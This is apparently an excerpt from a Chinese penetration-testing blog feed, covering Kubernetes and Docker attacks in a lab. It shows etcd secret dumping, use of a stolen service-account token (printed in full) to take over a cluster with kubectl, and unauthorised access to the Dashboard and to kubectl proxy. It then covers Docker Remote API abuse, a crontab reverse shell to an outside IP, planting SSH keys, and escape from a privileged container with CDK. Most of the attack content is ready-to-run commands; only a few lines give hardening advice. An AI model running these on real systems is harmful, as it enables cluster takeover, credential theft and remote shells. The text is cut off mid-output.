operator">-</span>insecure<span class="token operator">-</span>transport<span class="token operator">=</span>false <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>skip<span class="token operator">-</span>tls<span class="token operator">-</span>verify <span class="token operator">-</span><span class="token operator">-</span>endpoints<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">2379</span><span class="token operator">/</span> get <span class="token operator">/</span>registry<span class="token operator">/</span>secrets<span class="token operator">/</span>kube<span class="token operator">-</span>system<span class="token operator">/</span>clusterrole<span class="token operator">-</span>aggregation<span class="token operator">-</span>controller<span class="token operator">-</span>token<span class="token operator">-</span>gfrm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/k8sApi/uu5ICcNSA6mP0sZVG4Pnm2M4yMZLc0gdsirAC9CsdDU.png" alt="image"></p><h4 id="token认证访问Kube-Apiserver，使用kubectl接管集群"><a href="#token认证访问Kube-Apiserver，使用kubectl接管集群" class="headerlink" title="token认证访问Kube Apiserver，使用kubectl接管集群"></a>token认证访问Kube Apiserver，使用kubectl接管集群</h4><pre class="line-numbers language-python"><code class="language-python">curl <span class="token operator">-</span><span class="token operator">-</span>header <span class="token string">"Authorization: Bearer TOKEN"</span> <span class="token operator">-</span>X GET https<span class="token punctuation">:</span><span class="token operator">//</span>API_SERVER<span class="token punctuation">:</span><span class="token number">6443</span><span class="token operator">/</span>api <span class="token operator">-</span>kcurl <span class="token operator">-</span><span class="token operator">-</span>header <span class="token string">"Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLWdmcm0yIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5MjVlMDNlMS0xNmZjLTRiNDUtYmMzYi1kMDkzNTI3ZjQ3YzkiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.Pvn-Yx-x5gs-egGzvL0Jrh8AecbIYKUC2PvUZ6npuWYOj3Q-szY66mURMrd76eVGpQw9rrvmm7roU6vxRQiniXuy6DP_qkwkkCzozRvfELZoeDzfQWOLvW3pnSN5OLGz72Ls1oGXt9wXRp-2w7ThfHtU-yt6HArQSzDkP4Nq5NCOxHgCaPnNojuezWULKzrdfh3bsZG_gxW4vfHwKXnyCQNs-dIhwO881PzIsOHtORJ6zfkFqhuY8wnik-tYGKEuA1n4Tz0gAUovTNWkYyu_Lz09vU2Tur6dodLe63Nts800q5ahDTr4gzmTQUhGhJWhbtP_AS0Pf-z20OrSkHzt9g"</span> <span class="token operator">-</span>X GET https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">6443</span><span class="token operator">/</span>api <span class="token operator">-</span>kkubectl <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>skip<span class="token operator">-</span>tls<span class="token operator">-</span>verify <span class="token operator">-</span>s https<span class="token punctuation">:</span><span class="token operator">//</span>IP<span class="token punctuation">:</span><span class="token number">6443</span><span class="token operator">/</span> <span class="token operator">-</span><span class="token operator">-</span>token<span class="token operator">=</span><span class="token string">""</span> get nodes <span class="token operator">-</span>o widekubectl <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>skip<span class="token operator">-</span>tls<span class="token operator">-</span>verify <span class="token operator">-</span>s https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">6443</span><span class="token operator">/</span> <span class="token operator">-</span><span class="token operator">-</span>token<span class="token operator">=</span><span class="token string">"eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLWdmcm0yIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5MjVlMDNlMS0xNmZjLTRiNDUtYmMzYi1kMDkzNTI3ZjQ3YzkiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.Pvn-Yx-x5gs-egGzvL0Jrh8AecbIYKUC2PvUZ6npuWYOj3Q-szY66mURMrd76eVGpQw9rrvmm7roU6vxRQiniXuy6DP_qkwkkCzozRvfELZoeDzfQWOLvW3pnSN5OLGz72Ls1oGXt9wXRp-2w7ThfHtU-yt6HArQSzDkP4Nq5NCOxHgCaPnNojuezWULKzrdfh3bsZG_gxW4vfHwKXnyCQNs-dIhwO881PzIsOHtORJ6zfkFqhuY8wnik-tYGKEuA1n4Tz0gAUovTNWkYyu_Lz09vU2Tur6dodLe63Nts800q5ahDTr4gzmTQUhGhJWhbtP_AS0Pf-z20OrSkHzt9g"</span> get nodes <span class="token operator">-</span>o wide<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/O7m8JeFuV9ZPr3_9QlWqHy-gTGHLG2ySTtkqIEy_zRw.png" alt="image"></p><p><img src="/img/k8sApi/MZd2YuJhRiumDP3MM4zzZs2wBtosYaR1CJGW3py1tg8.png" alt="image"></p><p>通过配置文件控制</p><pre class="line-numbers language-Plain"><code class="language-Plain">touch test_configkubectl --kubeconfig=./test_config config set-credentials hacker --token=TOKENkubectl --kubeconfig=./test_config config set-cluster hacked_cluster --server=https://IP:6443/  --insecure-skip-tls-verifykubectl --kubeconfig=./test_config config set-context test_context --cluster=hacked_cluster --user=hackerkubectl --kubeconfig=./test_config config use-context test_contextkubectl --kubeconfig=./test_config get nodes -Atouch test_configkubectl --kubeconfig=./test_config2 config set-credentials tony --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLWdmcm0yIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI5MjVlMDNlMS0xNmZjLTRiNDUtYmMzYi1kMDkzNTI3ZjQ3YzkiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.Pvn-Yx-x5gs-egGzvL0Jrh8AecbIYKUC2PvUZ6npuWYOj3Q-szY66mURMrd76eVGpQw9rrvmm7roU6vxRQiniXuy6DP_qkwkkCzozRvfELZoeDzfQWOLvW3pnSN5OLGz72Ls1oGXt9wXRp-2w7ThfHtU-yt6HArQSzDkP4Nq5NCOxHgCaPnNojuezWULKzrdfh3bsZG_gxW4vfHwKXnyCQNs-dIhwO881PzIsOHtORJ6zfkFqhuY8wnik-tYGKEuA1n4Tz0gAUovTNWkYyu_Lz09vU2Tur6dodLe63Nts800q5ahDTr4gzmTQUhGhJWhbtP_AS0Pf-z20OrSkHzt9gkubectl --kubeconfig=./test_config2 config set-cluster tony_cluster --server=https://192.168.66.10:6443/  --insecure-skip-tls-verifykubectl --kubeconfig=./test_config2 config set-context test_context --cluster=tony_cluster --user=tonykubectl --kubeconfig=./test_config2 config use-context test_contextkubectl --kubeconfig=./test_config2 get nodes -A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/Pyu6I34nuDZtWVi0VhqwmGmF-Ea9rO6rACr_FdrSKZs.png" alt="image"></p><h3 id="Etcd防御与加固"><a href="#Etcd防御与加固" class="headerlink" title="Etcd防御与加固"></a>Etcd防御与加固</h3><p>通过上文攻击场景介绍，我们提出如下的防护建议用以加固Etcd服务：</p><p>在启动Etcd时，使用client-cert-auth参数打开证书校验；</p><p>Etcd数据加密存储，确保Etcd数据泄露后无法利用；</p><p>正确的配置listen-client-urls参数，防止外网暴露；</p><p>尽量避免在Etcd所在的节点上部署Web应用程序，以防通过Web应用漏洞攻击Etcd localhost地址。</p><h2 id="0x05-Dashboard未授权访问"><a href="#0x05-Dashboard未授权访问" class="headerlink" title="0x05 Dashboard未授权访问"></a>0x05 Dashboard未授权访问</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>Kubernetes Dashboard是一个基于Web的Kubernetes用户界面。我们能够获得当前集群中应用运行状态的概览，创建或修改Kubernetes资源，如Deployment、Job、DaemonSet等。我们能够扩展Deployment、执行滚动升级、重启Pod或在部署向导的辅助下部署新应用。其实就是用可视化的形式来做命令行的事。</p><p>Dashboard需要配置token才能够访问，</p><p><strong>在1.10.0及之前的版本提供了“跳过”（Skip）选项。但从1.10.1版本起，Dashboard默认禁用了“跳过”按钮。</strong></p><h3 id="搭建未授权版本的Dashboard"><a href="#搭建未授权版本的Dashboard" class="headerlink" title="搭建未授权版本的Dashboard"></a>搭建未授权版本的Dashboard</h3><p>在Harbor服务器上从阿里云拉取1.10.0版本的Dashboard镜像</p><p>然后打标签为<code>hub.atguigu.com/library/kubernetes-dashboard-amd64:v1.10.0</code></p><p>push到Harbor上。</p><pre class="line-numbers language-Plain"><code class="language-Plain">docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kubernetes-dashboard-amd64:v1.10.0docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/kubernetes-dashboard-amd64:v1.10.0  hub.atguigu.com/library/kubernetes-dashboard-amd64:v1.10.0docker push hub.atguigu.com/library/kubernetes-dashboard-amd64:v1.10.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/etbMDTv_Tng1DVnfS8lBZd4IJQR6wD7KcrH5lxi1lns.png" alt="image"></p><p>可以看到Harbor里已经有了dashboard的镜像，其中V1.10.0存在未授权，V1.10.1不存在未授权</p><p><img src="/img/k8sApi/HDhxyjPs4YK_o56Io6hvYMdaHoDME_7nuv7DYU5SIVM.png" alt="image"></p><p>下载dashboard的yaml配置文件，修改几处地方</p><pre class="line-numbers language-Plain"><code class="language-Plain">https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.0/src/deploy/recommended/kubernetes-dashboard.yaml将image改为了hub.atguigu.com/library/kubernetes-dashboard-amd64:v1.10.0，这样就能从本地的Harbor中拉取镜像修改如下的代码，为了能在node节点的32288端口访问dashboardspec:  type: NodePort  ports:    - port: 443      targetPort: 8443      nodePort: 32288<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终代码如下</p><pre class="line-numbers language-Plain"><code class="language-Plain"># Copyright 2017 The Kubernetes Authors.## Licensed under the Apache License, Version 2.0 (the "License");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at##     http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an "AS IS" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.# ------------------- Dashboard Secret ------------------- #apiVersion: v1kind: Secretmetadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard-certs  namespace: kube-systemtype: Opaque---# ------------------- Dashboard Service Account ------------------- #apiVersion: v1kind: ServiceAccountmetadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kube-system---# ------------------- Dashboard Role & Role Binding ------------------- #kind: RoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: kubernetes-dashboard-minimal  namespace: kube-systemrules:  # Allow Dashboard to create 'kubernetes-dashboard-key-holder' secret.- apiGroups: [""]  resources: ["secrets"]  verbs: ["create"]  # Allow Dashboard to create 'kubernetes-dashboard-settings' config map.- apiGroups: [""]  resources: ["configmaps"]  verbs: ["create"]  # Allow Dashboard to get, update and delete Dashboard exclusive secrets.- apiGroups: [""]  resources: ["secrets"]  resourceNames: ["kubernetes-dashboard-key-holder", "kubernetes-dashboard-certs"]  verbs: ["get", "update", "delete"]  # Allow Dashboard to get and update 'kubernetes-dashboard-settings' config map.- apiGroups: [""]  resources: ["configmaps"]  resourceNames: ["kubernetes-dashboard-settings"]  verbs: ["get", "update"]  # Allow Dashboard to get metrics from heapster.- apiGroups: [""]  resources: ["services"]  resourceNames: ["heapster"]  verbs: ["proxy"]- apiGroups: [""]  resources: ["services/proxy"]  resourceNames: ["heapster", "http:heapster:", "https:heapster:"]  verbs: ["get"]---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata:  name: kubernetes-dashboard-minimal  namespace: kube-systemroleRef:  apiGroup: rbac.authorization.k8s.io  kind: Role  name: kubernetes-dashboard-minimalsubjects:- kind: ServiceAccount  name: kubernetes-dashboard  namespace: kube-system---# ------------------- Dashboard Deployment ------------------- #kind: DeploymentapiVersion: apps/v1beta2metadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kube-systemspec:  replicas: 1  revisionHistoryLimit: 10  selector:    matchLabels:      k8s-app: kubernetes-dashboard  template:    metadata:      labels:        k8s-app: kubernetes-dashboard    spec:      containers:      - name: kubernetes-dashboard        image: hub.atguigu.com/library/kubernetes-dashboard-amd64:v1.10.0        ports:        - containerPort: 8443          protocol: TCP        args:          - --auto-generate-certificates          # Uncomment the following line to manually specify Kubernetes API server Host          # If not specified, Dashboard will attempt to auto discover the API server and connect          # to it. Uncomment only if the default does not work.          # - --apiserver-host=http://my-address:port        volumeMounts:        - name: kubernetes-dashboard-certs          mountPath: /certs          # Create on-disk volume to store exec logs        - mountPath: /tmp          name: tmp-volume        livenessProbe:          httpGet:            scheme: HTTPS            path: /            port: 8443          initialDelaySeconds: 30          timeoutSeconds: 30      volumes:      - name: kubernetes-dashboard-certs        secret:          secretName: kubernetes-dashboard-certs      - name: tmp-volume        emptyDir: {}      serviceAccountName: kubernetes-dashboard      # Comment the following tolerations if Dashboard must not be deployed on master      tolerations:      - key: node-role.kubernetes.io/master        effect: NoSchedule---# ------------------- Dashboard Service ------------------- #kind: ServiceapiVersion: v1metadata:  labels:    k8s-app: kubernetes-dashboard  name: kubernetes-dashboard  namespace: kube-systemspec:  type: NodePort  ports:    - port: 443      targetPort: 8443      nodePort: 32288  selector:    k8s-app: kubernetes-dashboard<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/YrdOhf67y7evLk7y5Ou0Fg7V6f7CFi2Z4qK2W5zaiKo.png" alt="image"></p><p><img src="/img/k8sApi/JORUgdS41ua3xsb8nU71-h9czs-JXUeUsXY0EpwlNVM.png" alt="image"></p><p>安装dashboard，并查看端口</p><pre class="line-numbers language-Plain"><code class="language-Plain">kubectl create -f kubernetes-dashboard.yamlkubectl get svc kubernetes-dashboard -n kube-system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/zMZWoB_hFBlOHIiAKNLfISS_VjlEqtHknyXkyDFfA9k.png" alt="image"></p><h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><p>成功访问到dashboard，可以看到有跳过按钮</p><p><img src="/img/k8sApi/7hnjvOhaHp_fPc_RZOWRGJzjXS2oFv09z6rooKbAV4M.png" alt="image"></p><p>点击跳过按钮，未授权进入</p><p><img src="/img/k8sApi/5oF2dc2_arScjWazmtG9GRIP-e9XL_wdd8ahSpKT4tM.png" alt="image"></p><p>然而通过点击 Skip 进入 dashboard 默认是没有操作集群的权限的，因为 Kubernetes 使用 RBAC(Role-based access control) 机制进行身份认证和权限管理，不同的 serviceaccount 拥有不同的集群权限。</p><p>我们点击 Skip 进入 dashboard 实际上使用的是 Kubernetes-dashboard 这个 ServiceAccount，如果此时该 ServiceAccount 没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。</p><p>但有些开发者为了方便或者在测试环境中会为 Kubernetes-dashboard 绑定 cluster-admin 这个 ClusterRole（cluster-admin 拥有管理集群的最高权限）。</p><p>利用条件有点难，遇到了可以参考<code>https://github.com/neargle/my-re0-k8s-security#74-dashboard</code></p><h2 id="0x06-kubectl-proxy-未授权"><a href="#0x06-kubectl-proxy-未授权" class="headerlink" title="0x06 kubectl proxy 未授权"></a>0x06 kubectl proxy 未授权</h2><h3 id="背景知识-1"><a href="#背景知识-1" class="headerlink" title="背景知识"></a>背景知识</h3><p>在K8S集群中的业务从外部默认是不能访问的，正式环境中，我们需要通过service， 然后通过Node的ip地址和Loadbanlencer来访问。但是还有一些简单的方式，其中之一就是kubectl proxy。</p><p>Kubectl 是管理K8S集群的，可以通过API访问控制单元，进而访问整个K8S集群。 <strong>如果想通过浏览器或者curl、wget等直接访问 K8S Rest API， 可以使用kubectl proxy</strong>， 他是运行Kubectl的机器和kubernets apiserver之间的一个反向代理。</p><p>kubectl proxy 转发的是 apiserver 所有的能力，而且是<strong>默认不鉴权</strong>的，所以 –address=0.0.0.0 就是极其危险的了。</p><h3 id="搭建未授权的环境"><a href="#搭建未授权的环境" class="headerlink" title="搭建未授权的环境"></a>搭建未授权的环境</h3><p>开启proxy，默认IP是本地，端口是8001</p><p><img src="/img/k8sApi/bpP7BqxUvDULAzkiTDOaw2-o7--DY7GPCY5Tzs02Z80.png" alt="image"></p><p>访问本地的8001端口，发现和前面的kube-apiserver一样</p><p><img src="/img/k8sApi/OG2TjPcano0pwI3tEUZwga5-6AcTehljoJZSnd5tFfE.png" alt="image"></p><p>外部访问发现是拒绝访问的</p><p><img src="/img/k8sApi/mpYXCZzXVL5mLidZMW4I6KtDjf_kkDu730KKze4WCk8.png" alt="image"></p><p><code>kubectl proxy --address=0.0.0.0  --accept-hosts=&#39;^*$&#39;</code> </p><p>必须带有<code>accept-hosts</code> ，否则会出现<code>Forbidden</code> 未认证的提示。通过<code>--accept-hosts=&#39;^*$&#39;</code> 设置API server接收所有主机的请求</p><p><img src="/img/k8sApi/XQ-z5TiR0zVIV1XeK6L2r5t0X0c0SLaFSeSkjiN7GEE.png" alt="image"></p><p>成功访问未授权</p><p><img src="/img/k8sApi/Q6dVzvJwJlofxWraQM_3edjkJ5o-TkUVnmKzAXBT4SU.png" alt="image"></p><h3 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h3><p>利用方式就和kube-apiserver一样了</p><p><code>kubectl -s http://192.168.66.10:8001 get pods -o wide</code></p><p><img src="/img/k8sApi/_8yBVdOXYnOSgPnB7vquCTonRYEDkCcgmyFUDMfbo_c.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> K8S </category>
          
      </categories>
      
      
        <tags>
            
            <tag> K8S渗透-API配置不当或未鉴权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker逃逸</title>
      <link href="/2022/08/03/docker-tao-yi/"/>
      <url>/2022/08/03/docker-tao-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h1><h2 id="0x01-判断是否是docker环境"><a href="#0x01-判断是否是docker环境" class="headerlink" title="0x01 判断是否是docker环境"></a>0x01 判断是否是docker环境</h2><ul><li>检查<code>/.dockerenv</code>文件是否存在</li><li>检查<code>/proc/1/cgroup</code>内是否包含<code>docker</code>等字符串。</li></ul><p><img src="/img/DockerEscape/image-20211102211340974.png" alt="image-20211102211340974"></p><h2 id="0x02-Docker-Remote-API未授权访问漏洞"><a href="#0x02-Docker-Remote-API未授权访问漏洞" class="headerlink" title="0x02 Docker Remote API未授权访问漏洞"></a>0x02 Docker Remote API未授权访问漏洞</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>Docker Remote API 是一个取代远程命令行界面的REST API，docker swarm是docker下的分布化应用的本地集群，在开放2375监听集群容器时，会调用这个api，因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell</p><h3 id="docker守护进程监听在0-0-0-0，外网可访问"><a href="#docker守护进程监听在0-0-0-0，外网可访问" class="headerlink" title="docker守护进程监听在0.0.0.0，外网可访问"></a>docker守护进程监听在0.0.0.0，外网可访问</h3><ol><li><code>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</code></li><li>docker守护进程监听在0.0.0.0，外网可访问</li><li>没有使用iptable等限制可连接的来源ip。</li></ol><h3 id="检验方法：2375端口"><a href="#检验方法：2375端口" class="headerlink" title="检验方法：2375端口"></a>检验方法：2375端口</h3><p>下面命令运行docker造成漏洞</p><p><code>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</code></p><p><img src="/img/DockerEscape/image-20220803151455075.png" alt="image-20220803151455075"></p><p>查看镜像</p><p>如果不存在则如下：</p><p><img src="/img/DockerEscape/image-20220803155655828.png" alt="image-20220803155655828"></p><p>存在则如下：</p><p><code>docker -H tcp://192.168.144.92:2375 images</code></p><p><img src="/img/DockerEscape/image-20220803151612115.png" alt="image-20220803151612115"></p><h3 id="手工利用：写计划任务和写公私钥"><a href="#手工利用：写计划任务和写公私钥" class="headerlink" title="手工利用：写计划任务和写公私钥"></a>手工利用：写计划任务和写公私钥</h3><p><strong>将该宿主机的根目录挂在到容器的/mnt目录下</strong></p><p><code>docker -H tcp://192.168.144.92:2375 run -it -v /:/mnt 458575a05d97 /bin/bash</code></p><p>然后写计划任务和写公私钥</p><pre><code>计划任务echo &#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.144.91/6666 0&gt;&amp;1&#39; &gt;&gt; /mnt/var/spool/cron/crontabs/root公私钥cd /mnt/root/mkdir .sshcd .ssh/echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqAVtXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXJYUk= root@user &gt;&gt; authorized_keys</code></pre><p><img src="/img/DockerEscape/image-20220803154103412.png" alt="image-20220803154103412"></p><p>成功使用公私钥免密登陆</p><p><img src="/img/DockerEscape/image-20220803154336699.png" alt="image-20220803154336699"></p><h2 id="0x03-特权模式"><a href="#0x03-特权模式" class="headerlink" title="0x03 特权模式"></a>0x03 特权模式</h2><h3 id="背景知识-1"><a href="#背景知识-1" class="headerlink" title="背景知识"></a>背景知识</h3><p>在特权模式下，容器拥有所有权利，包括宿主机的一些内核特性和设备访问等</p><p>所以在特权模式下，我们可以通过mount目录挂载至主机的硬盘内，让目录成为设备的访问点，实现文件系统层面的逃逸</p><h3 id="以特权模式运行一个容器"><a href="#以特权模式运行一个容器" class="headerlink" title="以特权模式运行一个容器"></a>以特权模式运行一个容器</h3><p><code>docker run -it --privileged -d --name vulhub_tomcat vulhub/tomcat:8.0</code></p><p><img src="/img/DockerEscape/image-20211102195342895.png" alt="image-20211102195342895"></p><p>进入容器<code>docker exec -it a740b2330d09 /bin/bash</code></p><h3 id="检验方法-0000003fffffffff"><a href="#检验方法-0000003fffffffff" class="headerlink" title="检验方法: 0000003fffffffff"></a><strong>检验方法</strong>: 0000003fffffffff</h3><p>第一种<code>grep CapEff /proc/self/status</code></p><p>如果结果是<code>0000003fffffffff</code>，则是在特权模式下</p><p><img src="/img/DockerEscape/image-20220802204651478.png" alt="image-20220802204651478"></p><p>如果不是，则非特权模式启动</p><p><img src="/img/DockerEscape/image-20220802204811304.png" alt="image-20220802204811304"></p><p>第二种<code>fdisk -l</code></p><p>特权模式下输出下面内容</p><p><img src="/img/DockerEscape/image-20220802205117364.png" alt="image-20220802205117364"></p><p>不以特权模式启动容器做比较，发现输入<code>fdisk -l</code>查询磁盘时，没有结果返回。</p><p><img src="/img/DockerEscape/image-20211102200157341.png" alt="image-20211102200157341"></p><h3 id="手工利用：计划任务和公私钥"><a href="#手工利用：计划任务和公私钥" class="headerlink" title="手工利用：计划任务和公私钥"></a>手工利用：计划任务和公私钥</h3><p>将/dev/vda2磁盘挂载到容器里的某个文件夹里</p><pre><code>root@a740b2330d09:/usr/local/tomcat# mkdir /abcroot@a740b2330d09:/usr/local/tomcat# mount /dev/vda2 /abcroot@a740b2330d09:/usr/local/tomcat# ls /abc</code></pre><p><img src="/img/DockerEscape/image-20211102195625796.png" alt="image-20211102195625796"></p><p>再往/abc目录下文件</p><p><code>root@a740b2330d09:/usr/local/tomcat# echo 111 &gt; /abc/root/11111111</code></p><p><img src="/img/DockerEscape/image-20211102195734091.png" alt="image-20211102195734091"></p><p>成功将文件写入进去</p><p><img src="/img/DockerEscape/image-20211102195817878.png" alt="image-20211102195817878"></p><p>这样也就成功的从容器中逃逸至外部宿主机</p><p><strong>后续同样通过写计划任务或者公私钥获取宿主机权限</strong></p><h3 id="CDK检测和利用"><a href="#CDK检测和利用" class="headerlink" title="CDK检测和利用"></a>CDK检测和利用</h3><p>检测命令</p><p><code>./cdk_linux_amd64_upx evaluate --full</code></p><p><img src="/img/DockerEscape/image-20220802212456919.png" alt="image-20220802212456919"></p><p>利用命令</p><pre><code>root@95a5e37d4649:/tmp# ./cdk_linux_amd64_upx run mount-disk{  &quot;device&quot;: &quot;/dev/sda5&quot;,  &quot;mountpoint&quot;: &quot;/etc/resolv.conf&quot;,  &quot;fstype&quot;: &quot;ext4&quot;,  &quot;opts&quot;: [    &quot;rw&quot;,    &quot;relatime&quot;,    &quot;bind&quot;  ]}{  &quot;device&quot;: &quot;/dev/sda5&quot;,  &quot;mountpoint&quot;: &quot;/etc/hostname&quot;,  &quot;fstype&quot;: &quot;ext4&quot;,  